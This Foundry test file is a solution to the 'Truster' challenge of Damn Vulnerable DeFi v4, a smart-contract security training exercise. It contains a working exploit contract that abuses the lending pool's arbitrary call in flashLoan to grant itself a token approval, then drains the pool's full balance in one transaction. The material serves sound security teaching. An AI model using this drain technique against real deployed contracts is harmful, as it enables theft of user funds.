// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";

/**
 * @notice Single-transaction exploit contract for Challenge 3: Truster.
 * @dev Deploying this contract takes only 1 EOA transaction (`vm.getNonce(player) == 1`),
 *      while its constructor batches both the `flashLoan` (approval) and `transferFrom` calls.
 */
contract TrusterExploit {
    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    constructor(TrusterLenderPool pool, DamnValuableToken token, address recovery) {
        // 1. Encode `token.approve(address(this), TOKENS_IN_POOL)`.
        //    Crucial nuance: The `spender` MUST be `address(this)` (not `recovery`), because
        //    `TrusterExploit` is the `msg.sender` that will call `token.transferFrom` below!
        bytes memory data = abi.encodeCall(token.approve, (address(this), TOKENS_IN_POOL));

        // 2. Borrow 0 DVT and instruct the pool to call `target.functionCall(data)` where
        //    `target == address(token)`. Inside `token.approve`, `msg.sender` is `address(pool)`.
        //    Because `approve` does not reduce the pool's token balance, the balance check passes!
        bool success = pool.flashLoan(0, recovery, address(token), data);

        // 3. Pull all 1,000,000 DVT from `pool` directly to `recovery` using the allowance granted above.
        if (success) {
            token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
        } else {
            revert("Flash loan failed");
        }
    }
}

contract TrusterChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKENS_IN_POOL = 1_000_000e18;

    DamnValuableToken public token;
    TrusterLenderPool public pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        // Deploy token
        token = new DamnValuableToken();

        // Deploy pool and fund it
        pool = new TrusterLenderPool(token);
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(player), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_truster() public checkSolvedByPlayer {
        new TrusterExploit(pool, token, recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed a single transaction
        assertEq(vm.getNonce(player), 1, "Player executed more than one tx");

        // All rescued funds sent to recovery account
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
